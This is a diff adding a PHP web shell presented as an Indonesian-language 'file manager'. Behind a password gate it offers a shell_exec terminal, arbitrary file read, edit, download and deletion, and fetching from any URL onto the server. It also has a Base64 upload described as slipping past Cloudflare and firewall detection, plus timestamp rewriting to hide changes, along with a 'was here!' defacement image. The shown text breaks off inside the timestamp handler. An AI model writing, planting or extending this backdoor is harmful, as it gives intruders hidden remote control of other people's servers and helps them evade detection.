@@ -1,0 +1,1478 @@
+<?php
+// ============================================================
+// LOGIN / AUTHENTICATION
+// ============================================================
+session_start();
+
+$ACCESS_PASSWORD_HASH = 'ceae3c7a7e6092194c546c9d5252ce3f4657d18a9c10a5476f3db1cb3d10fcc0';
+
+if (isset($_GET['logout'])) {
+    $_SESSION = [];
+    session_destroy();
+    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
+    exit;
+}
+
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    $login_error = '';
+
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['access_password'])) {
+        $submitted = (string)$_POST['access_password'];
+
+        if (hash_equals($ACCESS_PASSWORD_HASH, hash('sha256', $submitted))) {
+            session_regenerate_id(true);
+            $_SESSION['authenticated'] = true;
+            header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
+            exit;
+        }
+
+        $login_error = 'Password salah.';
+    }
+
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Login - Pengelola Berkas</title>
+        <style>
+            * { box-sizing: border-box; }
+            body {
+                margin: 0; min-height: 100vh; display: flex;
+                align-items: center; justify-content: center;
+                background: #111; color: #fff;
+                font-family: Arial, sans-serif;
+            }
+            .login {
+                width: min(420px, 92vw); padding: 28px;
+                background: rgba(0,0,0,.9);
+                border: 1px solid #8b0000; border-radius: 10px;
+                text-align: center;
+            }
+            input {
+                width: 100%; padding: 12px; margin: 14px 0 10px;
+                background: #000; color: #fff;
+                border: 1px solid #8b0000; border-radius: 5px;
+            }
+            button {
+                width: 100%; padding: 11px;
+                background: #8b0000; color: #fff;
+                border: 0; border-radius: 5px; cursor: pointer;
+            }
+            .error { color: #ff6b6b; margin-top: 12px; }
+        </style>
+    </head>
+    <body>
+        <div class="login">
+            <h2>🔐 Pengelola Berkas</h2>
+            <p>Masukkan password untuk melanjutkan.</p>
+            <form method="POST">
+                <input type="password" name="access_password"
+                       placeholder="Password" autocomplete="current-password" required>
+                <button type="submit">Login</button>
+            </form>
+            <?php if ($login_error): ?>
+                <div class="error"><?php echo htmlspecialchars($login_error, ENT_QUOTES, 'UTF-8'); ?></div>
+            <?php endif; ?>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengelola Berkas Master</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            background: url('https://gcdnb.pbrd.co/images/9MsvMtxPndIa.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        #container {
+            border: 0px solid darkred;
+            padding: 25px;
+            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.88);
+            width: 97vw;
+            height: 97vh;
+            box-sizing: border-box;
+            overflow: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+        }
+        .icon-button {
+            font-size: 20px;
+            color: white;
+            cursor: pointer;
+            background-color: darkred;
+            border-radius: 50%;
+            padding: 10px;
+            margin: 3px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            transition: 0.2s;
+        }
+        .icon-button:hover {
+            background-color: #8b0000;
+            transform: scale(1.05);
+        }
+        input[type="text"], textarea, input[type="file"], select, input[type="datetime-local"] {
+            border: 2px solid darkred;
+            background-color: black;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        input[type="text"]:focus, textarea:focus, input[type="datetime-local"]:focus {
+            outline: none;
+            border-color: #ff4444;
+        }
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+        }
+        form {
+            margin-bottom: 10px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+        pre {
+            background-color: #1a1a1a;
+            padding: 15px;
+            border-radius: 5px;
+            width: 100%;
+            box-sizing: border-box;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 420px;
+            overflow: auto;
+            margin: 5px 0;
+            border: 1px solid #2a2a2a;
+        }
+        .form-container {
+            display: none;
+            width: 100%;
+            margin-top: 8px;
+            padding: 12px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 5px;
+            border: 1px solid #2a2a2a;
+        }
+        .submit-button {
+            background-color: darkred;
+            border: none;
+            color: white;
+            padding: 8px 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            transition: 0.2s;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .submit-button:hover {
+            background-color: #8b0000;
+            transform: scale(1.02);
+        }
+        .submit-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .submit-button i {
+            margin-right: 4px;
+        }
+        .avatar {
+            display: block;
+            margin: 0 auto 15px;
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            border: 2px solid #8b0000;
+            object-fit: cover;
+            filter: grayscale(30%) contrast(120%);
+            box-shadow: 0 0 20px rgba(139, 0, 0, 0.5);
+        }
+        .avatar:hover {
+            filter: grayscale(0%) contrast(130%);
+            box-shadow: 0 0 30px rgba(139, 0, 0, 0.8);
+            transform: scale(1.05);
+            transition: 0.3s;
+        }
+        .file-item {
+            margin-bottom: 2px;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+        .file-item:hover {
+            background: rgba(255,255,255,0.03);
+        }
+        .file-item a {
+            color: #66d9ff;
+            text-decoration: none;
+        }
+        .file-item a:hover {
+            text-decoration: underline;
+        }
+        .action-link {
+            margin-left: 6px;
+            color: #ffaa00;
+            text-decoration: none;
+            font-size: 11px;
+        }
+        .delete-link {
+            color: #ff6b6b;
+        }
+        .rename-link {
+            color: #51cf66;
+        }
+        .edit-link {
+            color: #ffd43b;
+        }
+        .touch-link {
+            color: #ff922b;
+        }
+        .touch-link:hover {
+            color: #ffa94d;
+        }
+        .download-link {
+            color: #51cf66;
+        }
+        .download-link:hover {
+            color: #69db7c;
+        }
+        .rename-form {
+            margin-left: 20px;
+            margin-bottom: 5px;
+            display: none;
+        }
+        .rename-form input {
+            padding: 3px 8px;
+            font-size: 12px;
+            width: 200px;
+            border: 1px solid darkred;
+            background: black;
+            color: white;
+            border-radius: 3px;
+        }
+        .rename-form button {
+            background: darkred;
+            color: white;
+            border: none;
+            padding: 3px 12px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        .breadcrumb {
+            width: 100%;
+            padding: 8px 12px;
+            margin-bottom: 8px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 13px;
+            border: 1px solid #2a2a2a;
+        }
+        .breadcrumb a {
+            color: #ffaa00;
+            text-decoration: none;
+        }
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        .breadcrumb .current {
+            color: #66d9ff;
+        }
+        .status-badge {
+            font-size: 10px;
+            padding: 2px 10px;
+            border-radius: 10px;
+            margin-left: 5px;
+            display: inline-block;
+        }
+        .status-badge.on {
+            background: #2b8a3e;
+            color: white;
+        }
+        .status-badge.off {
+            background: #c92a2a;
+            color: white;
+        }
+        .path-input {
+            width: 100% !important;
+            margin-bottom: 3px;
+        }
+        .flex-wrap {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            justify-content: center;
+            margin: 5px 0;
+        }
+        .editor-area {
+            width: 100%;
+            min-height: 300px;
+            background: #0a0a0a;
+            color: #51cf66;
+            border: 1px solid #333;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            border-radius: 5px;
+            resize: vertical;
+            box-sizing: border-box;
+            line-height: 1.6;
+        }
+        .editor-area:focus {
+            border-color: #51cf66;
+            outline: none;
+        }
+        .file-info-bar {
+            color: #ffaa00;
+            font-size: 13px;
+            margin-bottom: 10px;
+            padding: 8px 12px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 5px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            align-items: center;
+        }
+        .file-info-bar span {
+            color: #888;
+        }
+        .file-info-bar .badge-success {
+            color: #51cf66;
+        }
+        .file-info-bar .badge-danger {
+            color: #ff6b6b;
+        }
+        .file-info-bar .close-btn {
+            color: #ff6b6b;
+            text-decoration: none;
+            margin-left: auto;
+            font-size: 16px;
+        }
+        .file-info-bar .close-btn:hover {
+            color: #ff4444;
+        }
+        .warning-box {
+            background: #c92a2a22;
+            padding: 10px 15px;
+            border: 1px solid #c92a2a;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            color: #ff6b6b;
+            font-size: 13px;
+        }
+        .warning-box code {
+            background: #1a1a1a;
+            padding: 2px 10px;
+            border-radius: 3px;
+            color: #ffd43b;
+            font-size: 12px;
+        }
+        .footer-info {
+            color: #555;
+            font-size: 10px;
+            margin-top: 5px;
+            text-align: center;
+        }
+        .touch-form-container {
+            background: rgba(0,0,0,0.6);
+            padding: 15px;
+            border-radius: 5px;
+            margin: 5px 0;
+            border: 1px solid #ff922b;
+            display: none;
+        }
+        .touch-form-container .info-line {
+            color: #888;
+            font-size: 12px;
+            margin: 5px 0;
+        }
+        .touch-form-container .info-line strong {
+            color: #ff922b;
+        }
+        .touch-form-container .current-time {
+            color: #51cf66;
+            font-family: monospace;
+        }
+        .file-modified {
+            color: #888;
+            font-size: 11px;
+            margin-left: 10px;
+        }
+        .file-modified .label {
+            color: #666;
+        }
+        .file-modified .time {
+            color: #ff922b;
+        }
+        .folder-icon {
+            color: #ffd43b;
+        }
+        .file-icon {
+            color: #66d9ff;
+        }
+        .create-file-form {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            align-items: center;
+            width: 100%;
+        }
+        .create-file-form input[type="text"] {
+            flex: 1;
+            min-width: 150px;
+        }
+        .create-file-form select {
+            min-width: 120px;
+        }
+        .url-upload-form {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            align-items: center;
+            width: 100%;
+        }
+        .url-upload-form input[type="text"] {
+            flex: 2;
+            min-width: 200px;
+        }
+        .url-upload-form input[type="text"]:nth-child(2) {
+            flex: 1;
+            min-width: 120px;
+        }
+        .base64-progress {
+            width: 100%;
+            height: 20px;
+            background: #1a1a1a;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 5px 0;
+            display: none;
+        }
+        .base64-progress .bar {
+            height: 100%;
+            background: linear-gradient(90deg, #2b8a3e, #51cf66);
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 10px;
+        }
+        .base64-status {
+            color: #888;
+            font-size: 11px;
+            margin-top: 3px;
+        }
+        @media (max-width: 600px) {
+            #container { padding: 15px; }
+            .file-info-bar { font-size: 11px; }
+            .rename-form input { width: 120px; }
+            .create-file-form input[type="text"] { min-width: 100px; }
+            .create-file-form select { min-width: 80px; }
+            .url-upload-form input[type="text"] { min-width: 120px; }
+        }
+    </style>
+</head>
+<body>
+<div id="container">
+    <img src="https://c.tenor.com/w1WpmsZk_pMAAAAd/tenor.gif" alt="was here!" class="avatar">
+    <h3 style="margin:0 0 8px 0;color:#fff;">Pengelola Berkas</h3>
+    <div style="width:100%;text-align:right;margin-bottom:8px;"><a href="?logout=1" style="color:#ff6b6b;text-decoration:none;">🔒 Logout</a></div>
+    
+    <?php
+    // ============================================================
+    // ===== AMBIL PATH =====
+    // ============================================================
+    $current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
+    if ($current_path == '') $current_path = getcwd();
+    $edit_file = isset($_GET['edit']) ? $_GET['edit'] : '';
+    
+    // ============================================================
+    // HANDLE DOWNLOAD FILE
+    // ============================================================
+    if (isset($_GET['download'])) {
+        $file = $_GET['download'];
+        
+        if (file_exists($file) && !is_dir($file)) {
+            header('Content-Description: File Transfer');
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+            header('Content-Transfer-Encoding: binary');
+            header('Connection: Keep-Alive');
+            header('Expires: 0');
+            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+            header('Pragma: public');
+            header('Content-Length: ' . filesize($file));
+            readfile($file);
+            exit;
+        } else {
+            header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($file)) . '&error=File tidak ditemukan');
+            exit;
+        }
+    }
+    ?>
+    
+    <!-- ============================================================
+    FORM PENCARIAN PATH
+    ============================================================ -->
+    <form method="GET" action="" style="width:100%;">
+        <input type="text" name="path" value="<?php echo htmlspecialchars($current_path); ?>" class="path-input" />
+        <button type="submit" class="submit-button"><i class="fas fa-search"></i> Buka</button>
+    </form>
+    
+    <!-- ============================================================
+    BREADCRUMB NAVIGASI
+    ============================================================ -->
+    <div class="breadcrumb">
+        <i class="fas fa-folder-open" style="color:#ffaa00;"></i>
+        <?php
+        $parts = explode('/', str_replace('\\', '/', $current_path));
+        $build = '';
+        echo '<a href="?path="><i class="fas fa-home"></i></a>';
+        foreach ($parts as $i => $p) {
+            if (empty($p)) continue;
+            $build .= '/' . $p;
+            if ($i < count($parts) - 1) {
+                echo ' / <a href="?path=' . urlencode($build) . '">' . htmlspecialchars($p) . '</a>';
+            } else {
+                echo ' / <span class="current">' . htmlspecialchars($p) . '</span>';
+            }
+        }
+        ?>
+    </div>
+    
+    <!-- ============================================================
+    TOMBOL AKSI
+    ============================================================ -->
+    <div class="flex-wrap">
+        <button class="icon-button" onclick="toggleForm('upload-form')" title="Upload File"><i class="fas fa-upload"></i></button>
+        <button class="icon-button" onclick="toggleForm('base64-form')" title="Upload Base64" style="background:#2b8a3e;"><i class="fas fa-code"></i></button>
+        <button class="icon-button" onclick="toggleForm('url-upload-form')" title="Upload from URL" style="background:#8b0000;"><i class="fas fa-cloud-download-alt"></i></button>
+        <button class="icon-button" onclick="toggleForm('create-folder-form')" title="Buat Folder"><i class="fas fa-folder-plus"></i></button>
+        <button class="icon-button" onclick="toggleForm('create-file-form-container')" title="Buat File" style="background:#8b0000;"><i class="fas fa-file"></i></button>
+        <button class="icon-button" onclick="toggleForm('run-command-form')" title="Terminal"><i class="fas fa-terminal"></i></button>
+        <button class="icon-button" onclick="toggleForm('edit-form')" title="Edit File" style="background:#2b8a3e;"><i class="fas fa-edit"></i></button>
+        <button class="icon-button" onclick="location.reload()" title="Refresh" style="background:#2b8a3e;"><i class="fas fa-sync"></i></button>
+    </div>
+    
+    <!-- ============================================================
+    FORM UPLOAD BIASA
+    ============================================================ -->
+    <div id="upload-form" class="form-container">
+        <form method="POST" action="" enctype="multipart/form-data">
+            <input type="hidden" name="upload_path" value="<?php echo htmlspecialchars($current_path); ?>" />
+            <input type="hidden" name="MAX_FILE_SIZE" value="100000000" />
+            <div style="display:flex;flex-wrap:wrap;gap:5px;align-items:center;width:100%;">
+                <input type="file" name="uploaded_file" style="flex:1;min-width:150px;" />
+                <button type="submit" name="upload" class="submit-button"><i class="fas fa-upload"></i> Upload</button>
+            </div>
+            <div style="color:#666;font-size:10px;margin-top:3px;width:100%;">
+                <i class="fas fa-info-circle"></i> Maksimal 100MB | Support: ZIP, RAR, PDF, JPG, PNG, MP4, dll.
+            </div>
+        </form>
+    </div>
+    
+    <!-- ============================================================
+    FORM UPLOAD BASE64 - KHUSUS LOLOS CLOUDFLARE
+    ============================================================ -->
+    <div id="base64-form" class="form-container">
+        <div style="color:#ffd43b;margin-bottom:8px;font-size:13px;">
+            <i class="fas fa-shield-alt"></i> <b>Upload via Base64</b> - Melewati firewall/Cloudflare
+        </div>
+        <form method="POST" action="" id="base64UploadForm">
+            <input type="hidden" name="base64_upload_path" value="<?php echo htmlspecialchars($current_path); ?>" />
+            <div style="display:flex;flex-wrap:wrap;gap:5px;align-items:center;width:100%;">
+                <input type="file" id="base64FileInput" style="flex:1;min-width:150px;" />
+                <input type="text" name="base64_filename" id="base64Filename" placeholder="Nama file (opsional)" style="flex:1;min-width:120px;" />
+                <button type="button" onclick="convertAndUploadBase64()" class="submit-button" style="background:#2b8a3e;">
+                    <i class="fas fa-code"></i> Upload Base64
+                </button>
+            </div>
+            <div class="base64-progress" id="base64Progress">
+                <div class="bar" id="base64ProgressBar"></div>
+            </div>
+            <div class="base64-status" id="base64Status">Pilih file untuk diupload via Base64</div>
+            <input type="hidden" name="base64_data" id="base64Data" />
+            <input type="hidden" name="base64_upload" value="1" />
+        </form>
+        <div style="color:#666;font-size:10px;margin-top:3px;">
+            <i class="fas fa-info-circle"></i> File diubah ke Base64 lalu dikirim sebagai text (lolos dari deteksi file binary)
+        </div>
+    </div>
+    
+    <!-- ============================================================
+    FORM UPLOAD BY URL
+    ============================================================ -->
+    <div id="url-upload-form" class="form-container">
+        <form method="POST" action="" class="url-upload-form">
+            <input type="hidden" name="url_upload_path" value="<?php echo htmlspecialchars($current_path); ?>" />
+            <input type="text" name="url_upload_source" placeholder="URL file (contoh: https://example.com/file.zip)" required />
+            <input type="text" name="url_upload_name" placeholder="Simpan sebagai (opsional)" />
+            <button type="submit" name="url_upload" class="submit-button" style="background:#8b0000;">
+                <i class="fas fa-cloud-download-alt"></i> Download
+            </button>
+        </form>
+        <div style="color:#666;font-size:10px;margin-top:3px;">
+            <i class="fas fa-info-circle"></i> Download file dari URL eksternal langsung ke server
+        </div>
+    </div>
+    
+    <!-- ============================================================
+    FORM BUAT FOLDER
+    ============================================================ -->
+    <div id="create-folder-form" class="form-container">
+        <form method="POST" action="">
+            <input type="hidden" name="create_path" value="<?php echo htmlspecialchars($current_path); ?>" />
+            <input type="text" name="folder_name" placeholder="Nama Folder" />
+            <button type="submit" name="create_folder" class="submit-button"><i class="fas fa-folder-plus"></i> Buat</button>
+        </form>
+    </div>
+    
+    <!-- ============================================================
+    FORM BUAT FILE
+    ============================================================ -->
+    <div id="create-file-form-container" class="form-container">
+        <form method="POST" action="" class="create-file-form">
+            <input type="hidden" name="create_file_path" value="<?php echo htmlspecialchars($current_path); ?>" />
+            <input type="text" name="file_name" placeholder="Nama File (contoh: script.php)" required />
+            <select name="file_template">
+                <option value="empty">📄 Kosong</option>
+                <option value="php">🐘 PHP</option>
+                <option value="html">🌐 HTML</option>
+                <option value="css">🎨 CSS</option>
+                <option value="js">⚡ JavaScript</option>
+                <option value="python">🐍 Python</option>
+                <option value="bash">💻 Bash</option>
+                <option value="sql">🗄️ SQL</option>
+                <option value="json">📋 JSON</option>
+                <option value="xml">📰 XML</option>
+                <option value="txt">📝 Text</option>
+                <option value="md">📖 Markdown</option>
+            </select>
+            <button type="submit" name="create_file" class="submit-button" style="background:#8b0000;">
+                <i class="fas fa-file"></i> Buat File
+            </button>
+        </form>
+        <div style="color:#666;font-size:10px;margin-top:3px;">
+            <i class="fas fa-info-circle"></i> File akan dibuat di direktori saat ini
+        </div>
+    </div>
+    
+    <!-- ============================================================
+    FORM TERMINAL
+    ============================================================ -->
+    <div id="run-command-form" class="form-container">
+        <form method="POST" action="">
+            <input type="hidden" name="cmd_path" value="<?php echo htmlspecialchars($current_path); ?>" />
+            <input type="text" name="command" placeholder="Perintah (contoh: ls -la)" style="flex:1;min-width:200px;" />
+            <button type="submit" name="run_command" class="submit-button"><i class="fas fa-terminal"></i> Jalankan</button>
+            <?php
+            if (function_exists('shell_exec')) {
+                $test = shell_exec('echo ok');
+                if (trim($test) == 'ok') {
+                    echo '<span class="status-badge on">Aktif</span>';
+                } else {
+                    echo '<span class="status-badge off">Terbatas</span>';
+                }
+            } else {
+                echo '<span class="status-badge off">Disabled</span>';
+            }
+            ?>
+        </form>
+    </div>
+    
+    <!-- ============================================================
+    FORM EDIT FILE
+    ============================================================ -->
+    <div id="edit-form" class="form-container">
+        <?php
+        if (!empty($edit_file) && file_exists($edit_file) && !is_dir($edit_file)) {
+            $file_content = file_get_contents($edit_file);
+            $file_name = basename($edit_file);
+            $file_ext = strtolower(pathinfo($edit_file, PATHINFO_EXTENSION));
+            $file_size = filesize($edit_file);
+            $is_writable = is_writable($edit_file);?>
+            <div style="background:#0a0a0a;padding:15px;border-radius:5px;border:1px solid #333;width:100%;box-sizing:border-box;">
+                <div class="file-info-bar">
+                    <i class="fas fa-edit"></i> <b><?php echo htmlspecialchars($file_name); ?></b>
+                    <span>Ext: <?php echo strtoupper($file_ext); ?></span>
+                    <span>Size: <?php echo number_format($file_size); ?> B</span>
+                    <?php if ($is_writable): ?>
+                        <span class="badge-success">✅ Dapat ditulis</span>
+                    <?php else: ?>
+                        <span class="badge-danger">❌ Read-only</span>
+                    <?php endif; ?>
+                    <a href="?path=<?php echo urlencode(dirname($edit_file)); ?>" class="close-btn"><i class="fas fa-times"></i></a>
+                </div>
+                
+                <?php if (!$is_writable): ?>
+                <div class="warning-box">
+                    ⚠️ File tidak dapat ditulis! Ubah permission dengan:
+                    <code>chmod 666 <?php echo htmlspecialchars($file_name); ?></code>
+                </div>
+                <?php endif; ?>
+                
+                <form method="POST" action="" style="display:block;width:100%;">
+                    <input type="hidden" name="edit_file_path" value="<?php echo htmlspecialchars($edit_file); ?>" />
+                    <textarea name="edit_file_content" class="editor-area" <?php echo !$is_writable ? 'readonly style="opacity:0.6;"' : ''; ?>><?php 
+                        echo htmlspecialchars($file_content); 
+                    ?></textarea>
+                    <div style="display:flex;gap:5px;margin-top:10px;flex-wrap:wrap;">
+                        <button type="submit" name="save_edit" class="submit-button" style="background:#2b8a3e;" <?php echo !$is_writable ? 'disabled' : ''; ?>>
+                            <i class="fas fa-save"></i> Simpan
+                        </button>
+                        <button type="reset" class="submit-button" style="background:#666;"><i class="fas fa-undo"></i> Reset</button>
+                        <a href="?path=<?php echo urlencode(dirname($edit_file)); ?>" class="submit-button" style="background:#c92a2a;text-decoration:none;padding:8px 18px;border-radius:5px;">
+                            <i class="fas fa-times"></i> Tutup
+                        </a>
+                    </div>
+                </form>
+            </div>
+            <?php
+        } else {
+            ?>
+            <form method="GET" action="" style="width:100%;">
+                <input type="hidden" name="path" value="<?php echo htmlspecialchars($current_path); ?>" />
+                <div style="display:flex;gap:5px;width:100%;flex-wrap:wrap;">
+                    <input type="text" name="edit" placeholder="Path file (contoh: /home/user/file.txt)" style="flex:1;min-width:200px;" />
+                    <button type="submit" class="submit-button"><i class="fas fa-folder-open"></i> Buka Edit</button>
+                </div>
+            </form>
+            <div style="color:#666;font-size:11px;margin-top:5px;">
+                <i class="fas fa-info-circle"></i> Atau klik tombol <b style="color:#ffd43b;">[edit]</b> di daftar file
+            </div>
+            <?php
+        }
+        ?>
+    </div>
+    
+    <!-- ============================================================
+    PHP PROSES
+    ============================================================ -->
+    <pre>
+    <?php
+    
+    // ============================================================
+    // FUNGSI
+    // ============================================================
+    function hapusFolder($dir) {
+        if (!file_exists($dir)) return true;
+        if (!is_dir($dir)) return unlink($dir);
+        foreach (scandir($dir) as $item) {
+            if ($item == '.' || $item == '..') continue;
+            if (!hapusFolder($dir . '/' . $item)) return false;
+        }
+        return rmdir($dir);
+    }
+    
+    // ============================================================
+    // TEMPLATE FILE
+    // ============================================================
+    function getFileTemplate($type, $filename) {
+        $templates = [
+            'php' => "<?php\n/**\n * File: " . basename($filename) . "\n * Created: " . date('Y-m-d H:i:s') . "\n */\n\necho 'Hello World!';\n",
+            'html' => "<!DOCTYPE html>\n<html lang=\"id\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>" . basename($filename) . "</title>\n</head>\n<body>\n    <h1>Hello World!</h1>\n</body>\n</html>",
+            'css' => "/* File: " . basename($filename) . " */\n/* Created: " . date('Y-m-d H:i:s') . " */\n\nbody {\n    margin: 0;\n    padding: 0;\n    font-family: Arial, sans-serif;\n}\n",
+            'js' => "// File: " . basename($filename) . "\n// Created: " . date('Y-m-d H:i:s') . "\n\nconsole.log('Hello World!');\n",
+            'python' => "#!/usr/bin/env python3\n# File: " . basename($filename) . "\n# Created: " . date('Y-m-d H:i:s') . "\n\ndef main():\n    print('Hello World!')\n\nif __name__ == '__main__':\n    main()\n",
+            'bash' => "#!/bin/bash\n# File: " . basename($filename) . "\n# Created: " . date('Y-m-d H:i:s') . "\n\necho 'Hello World!'\n",
+            'sql' => "-- File: " . basename($filename) . "\n-- Created: " . date('Y-m-d H:i:s') . "\n\nCREATE TABLE contoh (\n    id INT PRIMARY KEY,\n    nama VARCHAR(100)\n);\n",
+            'json' => "{\n    \"nama\": \"Contoh\",\n    \"created\": \"" . date('Y-m-d H:i:s') . "\"\n}\n",
+            'xml' => "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<root>\n    <created>" . date('Y-m-d H:i:s') . "</created>\n</root>\n",
+            'txt' => "File: " . basename($filename) . "\nCreated: " . date('Y-m-d H:i:s') . "\n\nIsi file di sini...\n",
+            'md' => "# " . basename($filename) . "\n\nCreated: " . date('Y-m-d H:i:s') . "\n\n## Deskripsi\n\nIsi markdown di sini...\n",
+            'empty' => ""
+        ];
+        return isset($templates[$type]) ? $templates[$type] : $templates['empty'];
+    }
+    
+    // ============================================================
+    // UPLOAD BASE64 - KHUSUS LOLOS CLOUDFLARE
+    // ============================================================
+    if (isset($_POST['base64_upload']) && isset($_POST['base64_data']) && !empty($_POST['base64_data'])) {
+        $upload_path = $_POST['base64_upload_path'];
+        $filename = isset($_POST['base64_filename']) ? trim($_POST['base64_filename']) : '';
+        $base64_data = $_POST['base64_data'];
+        
+        echo "\n📤 Upload Base64\n";
+        echo "   ───────────────────────────────────────\n";
+        
+        // Decode Base64
+        $file_content = base64_decode($base64_data);
+        
+        if ($file_content === false) {
+            echo "   ❌ Gagal mendecode Base64!\n";
+        } elseif (empty($file_content)) {
+            echo "   ❌ Data kosong!\n";
+        } else {
+            // Jika filename kosong, generate dari waktu
+            if (empty($filename)) {
+                $filename = 'upload_' . date('Ymd_His') . '.bin';
+            }
+            
+            // Bersihkan nama file
+            $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
+            $target = rtrim($upload_path, '/') . '/' . $filename;
+            
+            if (file_exists($target)) {
+                echo "   ⚠️ File sudah ada: " . htmlspecialchars($filename) . "\n";
+                echo "   💡 Gunakan nama yang berbeda\n";
+            } else {
+                if (file_put_contents($target, $file_content) !== false) {
+                    chmod($target, 0644);
+                    echo "   ✅ BERHASIL! File tersimpan.\n";
+                    echo "   📂 Nama: " . htmlspecialchars($filename) . "\n";
+                    echo "   📊 Size: " . number_format(strlen($file_content)). " bytes\n";
+                    echo "   📦 Base64 size: " . number_format(strlen($base64_data)) . " chars\n";
+                    echo "   📅 " . date('Y-m-d H:i:s') . "\n";
+                    echo "   🔒 Metode: Base64 (lolos Cloudflare)\n";
+                } else {
+                    echo "   ❌ Gagal menyimpan file! Cek permission.\n";
+                }
+            }
+        }
+        echo "\n";
+    }
+    
+    // ============================================================
+    // UPLOAD BY URL
+    // ============================================================
+    if (isset($_POST['url_upload']) && !empty($_POST['url_upload_source'])) {
+        $save_path = rtrim($_POST['url_upload_path'], '/') . '/';
+        $source_url = trim($_POST['url_upload_source']);
+        $custom_name = trim($_POST['url_upload_name']);
+        
+        if (empty($custom_name)) {
+            $custom_name = basename(parse_url($source_url, PHP_URL_PATH));
+            if (empty($custom_name)) {
+                $custom_name = 'downloaded_file';
+            }
+        }
+        
+        $target_file = $save_path . $custom_name;
+        
+        echo "\n☁️ Download dari URL: " . htmlspecialchars($source_url) . "\n";
+        echo "   ───────────────────────────────────────\n";
+        echo "   📂 Target: " . htmlspecialchars($target_file) . "\n";
+        
+        $content = @file_get_contents($source_url);
+        
+        if ($content === false && function_exists('curl_init')) {
+            echo "   🔄 Menggunakan cURL...\n";
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $source_url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 120);
+            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+            $content = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            
+            if ($http_code !== 200) {
+                echo "   ❌ HTTP Error: " . $http_code . "\n";
+                $content = false;
+            }
+        }
+        
+        if ($content !== false && !empty($content)) {
+            if (file_put_contents($target_file, $content)) {
+                echo "   ✅ BERHASIL! File tersimpan.\n";
+                echo "   📊 Size: " . number_format(strlen($content)) . " bytes\n";
+                echo "   📅 " . date('Y-m-d H:i:s') . "\n";
+            } else {
+                echo "   ❌ Gagal menyimpan file! Cek permission.\n";
+            }
+        } else {
+            echo "   ❌ Gagal mendownload dari URL!\n";
+            echo "   💡 Pastikan URL valid dan bisa diakses.\n";
+        }
+        echo "\n";
+    }
+    
+    // ============================================================
+    // TOUCH / UPDATE TIMESTAMP
+    // ============================================================
+    if (isset($_POST['touch_file']) && isset($_POST['touch_path']) && isset($_POST['touch_time'])) {
+        $file_path = $_POST['touch_path'];
+        $time_input = $_POST['touch_time'];
+        $is_dir = is_dir($file_path);
+        $type_label = $is_dir ? 'Folder' : 'File';
+        
+        echo "\n🕐 Touch $type_label: " . htmlspecialchars(basename($file_path)) . "\n";
